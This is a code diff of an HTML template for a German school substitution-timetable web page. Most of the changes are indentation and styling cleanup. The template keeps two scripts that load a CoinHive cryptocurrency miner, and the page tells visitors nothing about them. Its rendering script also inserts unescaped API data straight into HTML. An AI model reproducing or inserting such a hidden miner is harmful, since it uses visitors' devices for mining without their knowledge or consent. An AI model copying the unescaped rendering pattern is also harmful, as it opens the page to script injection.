@@ -2,79 +2,69 @@
 <html lang="de">
 
 <head>
-  <title>Vertretungsplan</title>
-  <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/materialize/0.100.2/css/materialize.min.css">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <link rel="manifest" href="/a/manifest.json">
-  <meta name="charset" content="utf-8">
-  <link rel="icon" href="/a/icons/drawable-xxhdpi/icon.png">
-  <link rel="icon" sizes="512x512" href="/a/icons/hiresfavicon.png">
-  <meta name="theme-color" content="#4db6ac">
-  <style>
-    body {
-      display: flex;
-      min-height: 100vh;
-      flex-direction: column;
-    }
-
-    #app {
-      flex: 1 0 auto;
-    }
-  </style>
+    <title>Vertretungsplan</title>
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/materialize/0.100.2/css/materialize.min.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="manifest" href="/a/manifest.json">
+    <meta name="charset" content="utf-8">
+    <link rel="icon" href="/a/icons/drawable-xxhdpi/icon.png">
+    <link rel="icon" sizes="512x512" href="/a/icons/hiresfavicon.png">
+    <meta name="theme-color" content="#4db6ac">
+    <link rel="stylesheet" href="/a/app.css">
 </head>
 
 <body>
-  <nav class="teal lighten-2"><a href="/" class="brand-logo center">Vertretungsplan</a></nav>
-  <div class="container" id="app">
+<nav class="teal lighten-2"><a href="/" class="brand-logo center">Vertretungsplan</a></nav>
+<div class="container" id="app">
     <div class="card-panel grey lighten-3">
-      <h4>Vertretungen</h4>
-      <p class="flow-text" id="title"></p>
-      <table class="responsive-table">
-        <thead>
-          <th>Stunde</th>
-          <th>Lehrer</th>
-          <th>Fach</th>
-          <th>Raum</th>
-          <th>Art</th>
-        </thead>
-        <tbody class="flow-text"></tbody>
-      </table>
+        <h4>Vertretungen</h4>
+        <p class="flow-text" id="title"></p>
+        <table class="responsive-table">
+            <thead>
+            <th>Stunde</th>
+            <th>Lehrer</th>
+            <th>Fach</th>
+            <th>Raum</th>
+            <th>Art</th>
+            </thead>
+            <tbody class="flow-text"></tbody>
+        </table>
     </div>
-  </div>
+</div>
 
-  <footer class="page-footer teal lighten-2">
+<footer class="page-footer teal lighten-2">
     <div class="footer-copyright">
-      <div class="container">
-        &copy; 2017 Daniel Malik
-        <a class="grey-text text-lighten-3 right" href="https://goo.gl/forms/SXzdoOPqodWYQi4r2">Fehler melden</a>
-      </div>
+        <div class="container">
+            &copy; 2017 Daniel Malik
+            <a class="grey-text text-lighten-3 right" href="https://goo.gl/forms/SXzdoOPqodWYQi4r2">Fehler melden</a>
+        </div>
     </div>
-  </footer>
+</footer>
 
-  <script type="text/javascript" src="https://code.jquery.com/jquery-3.2.1.min.js"></script>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/0.100.2/js/materialize.min.js"></script>
-  <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
-  <script src="/a/miner.js"></script>
-  <script>
+<script type="text/javascript" src="https://code.jquery.com/jquery-3.2.1.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/0.100.2/js/materialize.min.js"></script>
+<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
+<script src="/a/miner.js"></script>
+<script>
     $(() => {
-      $.getJSON("/api/{{ .klasse }}", data => {
-        $.each(data.vertretungen, (a, b) => {
-          (b.Type == "Entfall") ? $("tbody").append(
-            "<tr class='teal-text text-lighten-2'><td>" +
-            b.Std + "</td><td>" + b.Teacher +
-            "</td><td>" + b.Subject + "</td><td>" + b.Room + "</td><td>" + b.Type +
-            "</td></tr>"): $("tbody").append(
-            "<tr><td>" + b.Std + "</td><td>" +
-            b.Teacher +
-            "</td><td>" + b.Subject + "</td><td>" + b.Room + "</td><td>" + b.Type +
-            "</td></tr>");
-        });
-        $("h4").html(data.meta.Datum);
-        $("#title").html(data.meta.Klasse);
-      }).catch(m => Materialize.toast(m.status + ": " + m.responseJSON.message));
+        $.getJSON("/api/{{ .klasse }}", data => {
+            $.each(data.vertretungen, (a, b) => {
+                (b.Type == "Entfall") ? $("tbody").append(
+                        "<tr class='teal-text text-lighten-2'><td>" +
+                        b.Std + "</td><td>" + b.Teacher +
+                        "</td><td>" + b.Subject + "</td><td>" + b.Room + "</td><td>" + b.Type +
+                        "</td></tr>") : $("tbody").append(
+                        "<tr><td>" + b.Std + "</td><td>" +
+                        b.Teacher +
+                        "</td><td>" + b.Subject + "</td><td>" + b.Room + "</td><td>" + b.Type +
+                        "</td></tr>");
+            });
+            $("h4").html(data.meta.Datum);
+            $("#title").html(data.meta.Klasse);
+        }).catch(m => Materialize.toast(m.status + ": " + m.responseJSON.message));
     });
-  </script>
+</script>
 </body>
 
 </html>
